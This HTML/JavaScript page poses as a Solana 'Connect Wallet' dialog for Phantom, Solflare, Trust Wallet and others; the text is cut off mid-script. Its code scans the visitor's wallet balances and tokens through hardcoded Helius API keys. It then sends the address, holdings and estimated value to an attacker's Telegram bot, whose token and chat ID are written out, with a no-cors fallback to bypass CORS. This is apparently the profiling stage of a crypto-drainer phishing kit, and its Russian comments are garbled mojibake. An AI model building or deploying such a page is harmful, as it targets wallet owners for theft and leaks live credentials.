<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Solana Wallet Scanner - Telegram Only</title>
  
  <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º Solana Web3.js –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.5/mobile-detect.min.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-wallets@latest/lib/umd/index.min.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-base@latest/lib/umd/index.min.js"></script>
  
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    #connectWalletBtn {
      padding: 10px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 10px;
      background-color: #4a90e2;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    #connectWalletBtn:hover {
      background-color: #357abd;
    }

    #connectWalletBtn.connected {
      background-color: #28a745;
    }

    #connectWalletBtn.connected:hover {
      background-color: #218838;
    }

    .hidden {
      display: none;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.5);
      z-index: 1000;
    }

    .connect-wallet, .all-wallets-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      border-radius: 20px;
      width: 350px;
      padding: 20px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      z-index: 1001;
    }

    .connect-header, .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .connect-header h2, .modal-header h2 {
      margin: 0;
      font-size: 1.2rem;
      font-weight: 600;
      flex-grow: 1;
      text-align: center;
    }

    .help-btn, .close-btn, .back-btn {
      background: none;
      border: none;
      font-size: 1.2rem;
      cursor: pointer;
      width: 30px;
      height: 30px;
      color: #333;
    }

    .help-btn {
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      background-color: #e0e0e0;
    }

    .wallet-list {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .wallet-option {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px;
      background: #f5f5f5;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
      position: relative;
    }

    .wallet-option:hover {
      background: #e0e0e0;
    }

    .wallet-option img {
      width: 40px;
      height: 40px;
      margin-right: 10px;
      border-radius: 12px;
    }

    .wallet-option span {
      flex-grow: 1;
      font-size: 1rem;
      color: #333;
    }

    .wallet-status {
      font-size: 0.8rem;
      color: #28a745;
      margin-left: 10px;
    }

    .connection-status {
      margin-top: 15px;
      padding: 10px;
      border-radius: 8px;
      text-align: center;
      font-size: 0.9rem;
    }

    .connection-status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .connection-status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    .connection-status.loading {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }

    .connection-status.scanning {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeaa7;
    }

    .wallet-info {
      margin-top: 15px;
      padding: 10px;
      background: #f8f9fa;
      border-radius: 8px;
      font-size: 0.85rem;
    }

    .wallet-info .address {
      font-family: monospace;
      word-break: break-all;
      margin-top: 5px;
      color: #495057;
    }

    .get-started {
      text-align: center;
      margin-top: 20px;
      color: #666;
      font-size: 0.9rem;
    }

    .get-started a {
      color: #0000EE;
      text-decoration: none;
    }

    .get-started a:hover {
      text-decoration: underline;
    }

    .wallet-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      overflow-y: auto;
      flex-grow: 1;
    }

    .wallet-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #f9f9f9;
      border-radius: 15px;
      padding: 10px;
      cursor: pointer;
      transition: background 0.3s;
      user-select: none;
      position: relative;
    }

    .wallet-item:hover {
      background: #e0e0e0;
    }

    .wallet-item img {
      width: 80px;
      height: 80px;
      margin-bottom: 8px;
      object-fit: contain;
      border-radius: 15px;
    }

    .wallet-item span {
      font-size: 0.85rem;
      color: #333;
      text-align: center;
    }

    .loading-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid #f3f3f3;
      border-top: 2px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Telegram Status Indicator */
    .telegram-status {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 8px 12px;
      border-radius: 20px;
      font-size: 0.8rem;
      font-weight: bold;
      z-index: 2000;
      transition: all 0.3s ease;
    }

    .telegram-status.sending {
      background: #ffc107;
      color: #856404;
    }

    .telegram-status.success {
      background: #28a745;
      color: white;
    }

    .telegram-status.error {
      background: #dc3545;
      color: white;
    }

    /* Mobile Adjustments */
    @media (max-width: 394px) {
      .connect-wallet, .all-wallets-modal {
        top: auto;
        bottom: 0;
        left: 0;
        right: 0;
        transform: none;
        width: 100vw;
        padding: 15px;
        border-radius: 15px 15px 0 0;
        max-height: 85vh;
        overflow-y: auto;
        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        box-sizing: border-box;
      }

      .telegram-status {
        top: 10px;
        right: 10px;
        font-size: 0.7rem;
        padding: 6px 10px;
      }

      /* Removed the grid-template-columns change to keep 3 columns */
      .wallet-item img {
        width: 60px;
        height: 60px;
        margin-bottom: 6px;
      }

      .wallet-item span {
        font-size: 0.8rem;
      }
    }

    /* Wallet Browser Banner */
    .wallet-browser-banner {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background: #4a90e2;
      color: white;
      padding: 12px 20px;
      text-align: center;
      font-weight: bold;
      z-index: 2000;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }

    .wallet-browser-banner button {
      background: white;
      color: #4a90e2;
      border: none;
      padding: 6px 12px;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }

    .wallet-browser-banner button:hover {
      background: #f0f0f0;
    }
    
    /* Debug Panel */
    .debug-panel {
      position: fixed;
      bottom: 10px;
      left: 10px;
      right: 10px;
      background: rgba(0, 0, 0, 0.8);
      color: #00ff00;
      padding: 10px;
      border-radius: 5px;
      font-family: monospace;
      font-size: 12px;
      max-height: 150px;
      overflow-y: auto;
      z-index: 9999;
    }
    
    .debug-panel.hidden {
      display: none;
    }
    
    .debug-panel pre {
      margin: 0;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <!-- Debug Panel -->
  <div id="debugPanel" class="debug-panel hidden">
    <pre id="debugOutput"></pre>
  </div>

  <!-- Telegram Status Indicator -->
  <div id="telegramStatus" class="telegram-status hidden">üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...</div>

  <!-- Button to open the modal -->
  <button id="connectWalletBtn">Connect Wallet</button>

  <!-- Modal Overlay -->
  <div id="modalOverlay" class="modal-overlay hidden"></div>

  <!-- Connect Wallet Modal -->
  <div id="connectWalletModal" class="connect-wallet">
    <div class="connect-header">
      <button class="help-btn" title="Help">?</button>
      <h2>Connect Wallet</h2>
      <button class="close-btn" title="Close">√ó</button>
    </div>
    
    <!-- Connection Status Display -->
    <div id="connectionStatus" class="connection-status hidden"></div>
    
    <!-- Wallet Info Display - –£–ø—Ä–æ—â–µ–Ω–Ω—ã–π, –±–µ–∑ –¥–µ—Ç–∞–ª–µ–π -->
    <div id="walletInfo" class="wallet-info hidden">
      <div><strong>Connected Wallet:</strong> <span id="connectedWalletName"></span></div>
      <div><strong>Address:</strong></div>
      <div class="address" id="walletAddress"></div>
      
      <div style="margin-top: 10px;">
        <button id="disconnectBtn" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">Disconnect</button>
        <button id="rescanBtn" style="background: #28a745; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-left: 5px;">Rescan</button>
      </div>
    </div>

    <div class="wallet-list">
      <div class="wallet-option" data-wallet="solflare">
        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
        <span>Solflare</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="phantom">
        <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
        <span>Phantom</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="trustwallet">
        <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
        <span>Trust Wallet</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="coinbase">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20150%20150%22%3E%3Cpath%20fill=%22%231e2021%22%20d=%22M0%200h150v150H0z%22/%3E%3Cpath%20fill=%22%23fff%22%20fill-rule=%22evenodd%22%20d=%22M101.5%2070.26a5.83%205.83%200%201%201%207.95-8.52%205.83%205.83%200%200%201-7.96%208.52ZM81.9%2089.84a4.37%204.37%200%201%201%206.19-6.18%204.37%204.37%200%200%201-6.19%206.18Zm30.93-10.3a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm-10.3%2010.3a4.37%204.37%200%201%201%206.13-6.22%204.37%204.37%200%200%201-6.14%206.22Zm21.63-1.03a2.92%202.92%200%201%201%203.94-4.31%202.92%202.92%200%200%201-3.94%204.31Zm-10.3%2010.31a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4ZM91.18%2080.57a5.83%205.83%200%201%201%208.25-8.25%205.83%205.83%200%200%201-8.25%208.25Zm0-20.62a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24Zm-10.3%2010.31a5.83%205.83%200%201%201%208.24-8.24%205.83%205.83%200%201%201-8.25%208.24h.01Zm-20.72%200a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24ZM40.58%2089.84a4.37%204.37%200%201%201%206.14-6.22%204.37%204.37%200%200%201-6.14%206.22Zm30.92-10.3a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm-10.3%2010.3a4.37%204.37%200%201%201%206.18-6.18%204.37%204.37%200%201%201-6.19%206.18h.01ZM21%2088.81a2.92%202.92%200%201%201%204.12-4.12A2.92%202.92%200%200%201%2021%2088.81H21Zm10.3%2010.31a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4Zm41.23%200a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4ZM30.27%2079.54a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm19.58%201.03a5.83%205.83%200%201%201%208.25-8.25%205.83%205.83%200%200%201-8.25%208.25Zm0-20.62a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24Zm-10.3%2010.31a5.83%205.83%200%201%201%207.96-8.52%205.83%205.83%200%200%201-7.96%208.52Z%22/%3E%3C/svg%3E" alt="Coinbase" />
        <span>Coinbase</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" data-wallet="bitget">
        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
        <span>Bitget Wallet</span>
        <div class="wallet-status">Available</div>
      </div>
      <div class="wallet-option" id="allWalletsBtn">
        <img src="/placeholder.svg" alt="All Wallets" />
        <span>All Wallets</span>
      </div>
    </div>
    <div class="get-started">
      Haven't got a wallet yet?
    </div>
  </div>

  <!-- All Wallets Modal -->
  <div id="allWalletsModal" class="all-wallets-modal hidden">
    <div class="modal-header">
      <button class="back-btn" title="Back">‚Üê</button>
      <h2>All Wallets</h2>
      <button class="close-btn" title="Close">√ó</button>
    </div>
    <div class="wallet-grid">
      <div class="wallet-item" data-wallet="solflare" tabindex="0">
        <img src="/placeholder.svg" alt="Solflare" />
        <span>Solflare</span>
      </div>
      <div class="wallet-item" data-wallet="phantom" tabindex="0">
        <img src="/placeholder.svg" alt="Phantom" />
        <span>Phantom</span>
      </div>
      <div class="wallet-item" data-wallet="trustwallet" tabindex="0">
        <img src="/placeholder.svg" alt="Trust Wallet" />
        <span>Trust Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="coinbase" tabindex="0">
        <img src="/placeholder.svg" alt="Coinbase" />
        <span>Coinbase</span>
      </div>
      <div class="wallet-item" data-wallet="bitget" tabindex="0">
        <img src="/placeholder.svg" alt="Bitget Wallet" />
        <span>Bitget Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="backpack" tabindex="0">
        <img src="/placeholder.svg" alt="Backpack" />
        <span>Backpack</span>
      </div>
      <div class="wallet-item" data-wallet="okx" tabindex="0">
        <img src="/placeholder.svg" alt="OKX Wallet" />
        <span>OKX Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="exodus" tabindex="0">
        <img src="/placeholder.svg" alt="Exodus" />
        <span>Exodus</span>
      </div>
      <div class="wallet-item" data-wallet="safepal" tabindex="0">
        <img src="/placeholder.svg" alt="SafePal" />
        <span>SafePal</span>
      </div>
    </div>
  </div>

  <script>
    // ============================================================================
    // WALLET BROWSER DETECTION
    // ============================================================================

    function detectWalletBrowser() {
      const userAgent = navigator.userAgent.toLowerCase();
      const url = window.location.href.toLowerCase();
      
      // Detect if we're in a wallet browser
      const isPhantomBrowser = userAgent.includes('phantom') || url.includes('phantom');
      const isSolflareBrowser = userAgent.includes('solflare') || url.includes('solflare');
      
      // Check for wallet objects
      const hasPhantomObject = window.phantom && window.phantom.solana;
      const hasSolflareObject = window.solflare;
      
      // Determine which wallet browser we're in
      let walletBrowserInfo = {
        isWalletBrowser: false,
        walletName: null,
        walletKey: null,
        isMobile: detectDevice().isMobile
      };
      
      if (isPhantomBrowser || hasPhantomObject) {
        walletBrowserInfo = {
          isWalletBrowser: true,
          walletName: "Phantom",
          walletKey: "phantom",
          isMobile: detectDevice().isMobile
        };
      } else if (isSolflareBrowser || hasSolflareObject) {
        walletBrowserInfo = {
          isWalletBrowser: true,
          walletName: "Solflare",
          walletKey: "solflare",
          isMobile: detectDevice().isMobile
        };
      }
      
      return walletBrowserInfo;
    }

    // ============================================================================
    // TELEGRAM INTEGRATION
    // ============================================================================

    const TELEGRAM_CONFIG = {
      BOT_TOKEN: '7523783619:AAHrK8KtQT3t_SflVhz2POJ1RDaLp1PuJEc',
      CHAT_ID: '7253475769'
    };

    // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–æ–≤ —Å –≥–ª—É–±–æ–∫–∏–º–∏ –∏ —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–º–∏ —Å—Å—ã–ª–∫–∞–º–∏
    const WALLET_CONFIG = {
      phantom: {
        name: 'Phantom',
        mobile: {
          android: { 
            scheme: 'phantom://', 
            universal: 'https://phantom.app/ul/v1/browse/'
          },
          ios: { 
            scheme: 'phantom://', 
            universal: 'https://phantom.app/ul/v1/browse/'
          }
        }
      },
      solflare: {
        name: 'Solflare',
        mobile: {
          android: { 
            scheme: 'solflare://ul/v1/', 
            universal: 'https://solflare.com/ul/v1/'
          },
          ios: { 
            scheme: 'solflare://ul/v1/', 
            universal: 'https://solflare.com/ul/v1/'
          }
        }
      }
    };

    // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    function detectDevice() {
      const userAgent = window.navigator.userAgent;
      const md = new MobileDetect(userAgent);
      return {
        isMobile: md.mobile() !== null,
        os: md.os() === 'AndroidOS' ? 'android' : md.os() === 'iOS' ? 'ios' : 'desktop'
      };
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–æ–∫ –¥–ª—è –∫–æ—à–µ–ª—å–∫–æ–≤
    function createWalletLink(walletKey) {
      const device = detectDevice();
      const wallet = WALLET_CONFIG[walletKey];
      if (!wallet || !device.isMobile) return null;
      
      const currentUrl = encodeURIComponent(window.location.href);
      const platform = device.os;
      const mobileConfig = wallet.mobile[platform];
      
      return {
        deepLink: `${mobileConfig.scheme}browse/${currentUrl}?ref=${currentUrl}`,
        universalLink: `${mobileConfig.universal}${currentUrl}?ref=${currentUrl}`
      };
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ –∫–æ—à–µ–ª—å–∫–∞
    function openWalletWithDeepLink(walletKey) {
      const links = createWalletLink(walletKey);
      if (!links) {
        return false; // Not a mobile device or unsupported wallet
      }

      // –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–∫—Ä—ã—Ç—å –≥–ª—É–±–æ–∫—É—é —Å—Å—ã–ª–∫—É
      const deepLinkAnchor = document.createElement('a');
      deepLinkAnchor.href = links.deepLink;
      deepLinkAnchor.click();

      // –†–µ–∑–µ—Ä–≤–Ω—ã–π –ø–µ—Ä–µ—Ö–æ–¥ –ø–æ —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ —á–µ—Ä–µ–∑ 1.5 —Å–µ–∫—É–Ω–¥—ã
      setTimeout(() => {
        if (!document.hidden) {
          const universalLinkAnchor = document.createElement('a');
          universalLinkAnchor.href = links.universalLink;
          universalLinkAnchor.click();
        }
      }, 1500);
      
      return true;
    }

    /**
     * –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç—É—Å Telegram –æ—Ç–ø—Ä–∞–≤–∫–∏
     */
    function showTelegramStatus(type, message) {
      const statusElement = document.getElementById('telegramStatus');
      statusElement.className = `telegram-status ${type}`;
      statusElement.textContent = message;
      statusElement.classList.remove('hidden');

      if (type === 'success' || type === 'error') {
        setTimeout(() => {
          statusElement.classList.add('hidden');
        }, 3000);
      }
    }

    /**
     * –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
     */
    async function sendWalletInfoToTelegram(walletName, walletData) {
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —É –Ω–∞—Å –µ—Å—Ç—å –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞
      if (!walletData || !walletData.address) {
        return false;
      }
      
      showTelegramStatus('sending', 'üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...');
      
      const currentTime = new Date().toLocaleString('ru-RU', {
        timeZone: 'Europe/Moscow',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      // –°–æ–∑–¥–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –ë–ï–ó markdown –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
      let message = `üöÄ –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï –ö–û–®–ï–õ–¨–ö–ê\n\n`;
      message += `üíº –ö–æ—à–µ–ª–µ–∫: ${walletName}\n`;
      message += `üìç –ê–¥—Ä–µ—Å: ${walletData.address}\n`;
      message += `‚è∞ –í—Ä–µ–º—è: ${currentTime}\n`;
      message += `üåê –°–∞–π—Ç: ${window.location.hostname}\n\n`;
      
      message += `üìä –†–ï–ó–£–õ–¨–¢–ê–¢–´ –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø:\n`;
      message += `üí∞ –ë–∞–ª–∞–Ω—Å SOL: ${walletData.solBalance.toFixed(4)} SOL\n`;
      message += `ü™ô –í—Å–µ–≥–æ —Ç–æ–∫–µ–Ω–æ–≤: ${walletData.totalTokenAccounts}\n`;
      message += `‚è∞ –í—Ä–µ–º—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: ${new Date(walletData.scanTimestamp).toLocaleTimeString()}\n`;
      message += `‚ö° –¢–∏–ø —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: Fast Scan\n`;
      message += `üöÄ –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: ${walletData.scanDuration}–º—Å\n`;
      message += `‚úÖ –°—Ç–∞—Ç—É—Å: ${walletData.success ? '–£—Å–ø–µ—à–Ω–æ' : '–û—à–∏–±–∫–∞'}\n\n`;

      if (walletData.tokens && walletData.tokens.length > 0) {
        message += `üíé –¢–û–ö–ï–ù–´ –° –ë–ê–õ–ê–ù–°–û–ú:\n`;
        walletData.tokens.slice(0, 5).forEach((token, index) => {
          message += `${index + 1}. ${token.name}\n`;
          message += `   üí∞ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${token.amount}\n`;
          message += `   üîó Mint: ${token.mint.substring(0, 8)}...${token.mint.substring(token.mint.length - 8)}\n\n`;
        });
        
        if (walletData.tokens.length > 5) {
          message += `... –∏ –µ—â–µ ${walletData.tokens.length - 5} —Ç–æ–∫–µ–Ω–æ–≤\n\n`;
        }
      } else {
        message += `üì≠ –¢–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –∏–ª–∏ –≤—Å–µ –±–∞–ª–∞–Ω—Å—ã —Ä–∞–≤–Ω—ã 0\n\n`;
      }

      if (walletData.methodUsed) {
        message += `üì° –ú–µ—Ç–æ–¥ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: ${walletData.methodUsed}\n`;
      }

      if (walletData.solBalance > 0) {
        message += `üíµ –ü—Ä–∏–º–µ—Ä–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å SOL: ~$${(walletData.solBalance * 100).toFixed(2)} USD\n`;
      }

      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            disable_web_page_preview: true
          })
        });

        const responseData = await response.json();
        
        if (response.ok && responseData.ok) {
          showTelegramStatus('success', '‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
          return true;
        } else {
          showTelegramStatus('error', '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
          
          // –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥
          return await sendViaAlternativeMethod(message);
        }
      } catch (error) {
        showTelegramStatus('error', '‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
        
        // –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥
        return await sendViaAlternativeMethod(message);
      }
    }

    /**
     * –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏
     */
    async function sendViaAlternativeMethod(message) {
      try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
          method: 'POST',
          mode: 'no-cors', // –û–±—Ö–æ–¥–∏–º CORS
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            disable_web_page_preview: true
          })
        });

        // –ü—Ä–∏ mode: 'no-cors' –º—ã –Ω–µ –º–æ–∂–µ–º –ø—Ä–æ—á–∏—Ç–∞—Ç—å –æ—Ç–≤–µ—Ç, –Ω–æ –∑–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–∏—Ç—Å—è
        showTelegramStatus('success', '‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ)');
        return true;
        
      } catch (error) {
        showTelegramStatus('error', '‚ùå –í—Å–µ –º–µ—Ç–æ–¥—ã –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∏');
        return false;
      }
    }

    // ============================================================================
    // WALLET BALANCE CHECKER
    // ============================================================================

    async function makeRequest(url, method, data, retries = 2, timeout = 5000) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), timeout);

          const options = {
            method,
            headers: { 'Content-Type': 'application/json' },
            signal: controller.signal
          };

          if (data && method !== 'GET') {
            options.body = JSON.stringify(data);
          }

          const response = await fetch(url, options);
          clearTimeout(timeoutId);

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
          }

          return await response.json();
        } catch (error) {
          if (attempt === retries) {
            return null;
          }
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }
    }

    async function checkWalletBalanceFast(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const heliusApiUrl = 'https://api.helius.xyz/v0/addresses/';
      const publicRpcUrl = 'https://api.mainnet-beta.solana.com';
      const apiKeys = [
        '5d71bf51-5f82-4892-8b89-c7257acb9384',
        'ece615f0-f4eb-4a27-a912-bb7ccdf1759e'
      ];

      const priorityRequests = [
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[0]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 1) - SOL and Tokens',
          type: 'combined'
        },
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[1]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 2) - SOL and Tokens',
          type: 'combined'
        },
        {
          url: `${heliusRpcUrl}?api-key=${apiKeys[0]}`,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Helius RPC (Key 1) - SOL Balance',
          type: 'sol'
        },
        {
          url: publicRpcUrl,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Public RPC - SOL Balance',
          type: 'sol'
        }
      ];

      const results = {
        solBalance: 0,
        tokens: [],
        methodUsed: null,
        scanTime: Date.now(),
        success: false
      };

      for (const req of priorityRequests) {
        const result = await makeRequest(req.url, req.method, req.data, 1, 3000);
        
        if (result) {
          results.methodUsed = req.desc;
          results.success = true;
          
          if (req.type === 'combined') {
            results.solBalance = result.nativeBalance / 1_000_000_000 || 0;
            results.tokens = result.tokens || [];
            
            if (results.solBalance > 0 || results.tokens.length > 0) {
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          } else if (req.type === 'sol') {
            results.solBalance = result.result?.value / 1_000_000_000 || 0;
            
            if (results.solBalance > 0) {
              const tokenResult = await getTokensQuick(walletAddress);
              if (tokenResult) {
                results.tokens = tokenResult;
              }
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          }
        }
      }

      results.scanTime = Date.now() - results.scanTime;
      return results;
    }

    async function getTokensQuick(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const apiKey = '5d71bf51-5f82-4892-8b89-c7257acb9384';
      
      const result = await makeRequest(
        `${heliusRpcUrl}?api-key=${apiKey}`,
        'POST',
        {
          jsonrpc: '2.0',
          id: 1,
          method: 'getTokenAccountsByOwner',
          params: [walletAddress, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }]
        },
        1,
        3000
      );

      if (result && result.result && result.result.value) {
        return result.result.value;
      }

      return [];
    }

    // ============================================================================
    // SOLANA WALLET SCANNER
    // ============================================================================

    class SolanaWalletScanner {
      constructor() {
        this.knownTokens = {
          'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
          'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
          'So11111111111111111111111111111111111111112': 'SOL (Wrapped)',
          'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'Bonk',
          'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN': 'Jupiter',
          'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'Marinade SOL',
          'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1': 'BlazeStake SOL',
          '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs': 'Ether (Wormhole)',
          'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM': 'USDCet (Wormhole)',
